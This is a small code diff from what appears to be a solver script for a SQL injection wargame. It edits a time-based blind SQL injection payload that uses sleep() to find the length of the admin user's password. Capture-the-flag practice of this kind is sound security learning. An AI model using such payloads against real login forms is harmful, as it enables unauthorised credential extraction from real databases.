@@ -39,7 +39,7 @@ def main():
     inj_param = 'pw'
     other_param = {'id': 'admin'}
 
-    payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
+    payload = "' or id='admin' and if(length(pw)<%s,sleep(3),0)#"
     p = los.SqlInjection(url, cook, method, inj_param, payload,
                          other_param=other_param)
     len_of_key = p.find_key_len(check_func)
